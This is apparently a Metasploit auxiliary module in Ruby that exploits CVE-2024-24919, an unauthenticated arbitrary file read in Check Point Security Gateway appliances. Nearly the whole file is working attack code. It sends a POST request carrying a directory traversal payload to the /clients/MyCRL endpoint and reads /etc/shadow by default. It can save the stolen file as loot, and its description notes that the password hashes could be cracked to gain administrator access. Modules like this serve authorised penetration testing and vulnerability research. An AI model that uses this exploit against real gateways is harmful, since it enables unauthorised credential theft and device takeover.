##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Check Point Security Gateway Arbitrary File Read',
        'Description' => %q{
          This module leverages an unauthenticated arbitrary root file read vulnerability for
          Check Point Security Gateway appliances. When the IPSec VPN or Mobile Access blades
          are enabled on affected devices, traversal payloads can be used to read any files on
          the local file system. Password hashes read from disk may be cracked, potentially
          resulting in administrator-level access to the target device. This vulnerability is
          tracked as CVE-2024-24919.
        },
        'Author' => [ 'remmons-r7' ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          # At the time of module development, no IOCs for this local file disclosure are known
          'SideEffects' => [],
          'Reliability' => []
        },
        'DefaultOptions' => { 'SSL' => true },
        'References' => [
          # Vendor advisory
          [ 'URL', 'https://support.checkpoint.com/results/sk/sk182336' ],
          # Rapid7 ETR advisory for CVE-2024-24919
          [ 'URL', 'https://www.rapid7.com/blog/post/2024/05/30/etr-cve-2024-24919-check-point-security-gateway-information-disclosure/' ],
          # Publication of first proof-of-concept exploit
          [ 'URL', 'https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/' ]
        ]
      )
    )

    register_options(
      [
        Opt::RPORT(443),
        OptBool.new('STORE_LOOT', [true, 'Store the target file as loot', false]),
        OptString.new('TARGETFILE', [true, 'The target file to read. This should be a full Linux file path. Files containing binary data may not be read accurately', '/etc/shadow']),
        OptString.new('TARGETURI', [true, 'The URI path to Check Point Security Gateway', '/'])
      ]
    )
  end

  def check
    # Attempt to read the /etc/group file (used in check due to lower likelihood of being flagged vs something like /etc/shadow)
    res_file = read_file('/etc/group')

    # Check for connection failure
    return Msf::Exploit::CheckCode::Unknown('Connection failed - unable to complete web request') unless res_file

    # If the response body includes the string "root", we can assume the target is vulnerable
    unless res_file.body.include?('root')
      return Msf::Exploit::CheckCode::Safe('Arbitrary file read failed - the target did not respond with the requested file')
    end

    Msf::Exploit::CheckCode::Vulnerable('Arbitrary file read successful!')
  end

  def run
    # After the auto check confirms the target is vulnerable, attempt to leak the specified target file
    file_name = datastore['TARGETFILE']
    res_read_file = read_file(file_name)

    # Check for connection failure
    fail_with(Failure::Unknown, 'Connection failed - unable to complete web request') unless res_read_file

    # If the response indicates that the target file does not exist, fail with NotFound
    if (res_read_file&.code == 404) || (res_read_file.body.include? 'The URL you requested could not be found on this server.')
      fail_with(Failure::NotFound, 'The requested file was not found - the target file does not exist or the system cannot read it')
    end

    # If the vulnerable server responds with a status other than the expected 200 or 404 (for example, a WAF 403), fail with UnexpectedReply
    if res_read_file&.code != 200
      fail_with(Failure::UnexpectedReply, "The application did not respond with a 200 as expected - the HTTP response code was: #{res_read_file&.code}")
    end

    # Assign variable with file contents, then store the file in loot or print the contents
    file_data = res_read_file.body

    if datastore['STORE_LOOT']
      store_loot(File.basename(file_name), 'text/plain', datastore['RHOST'], file_data, file_name, 'File read from Check Point Security Gateway server')
      print_good('Stored the file data to loot...')
    else
      # A new line is sent before file contents for better readability
      print_good("File read succeeded! \n#{file_data}")
    end
  end

  # Performs a POST request with a traversal payload in the body
  # Responses should either be a 200 with only the file contents in the body or a 404 for files that do not exist
  def read_file(fname)
    send_request_cgi(
      {
        'method' => 'POST',
        'uri' => normalize_uri(target_uri.path, 'clients', 'MyCRL'),
        'headers' => { 'Connection' => 'close' },
        'data' => "aCSHELL/../../../../../../../../../..#{fname}"
      }
    )
  end
end
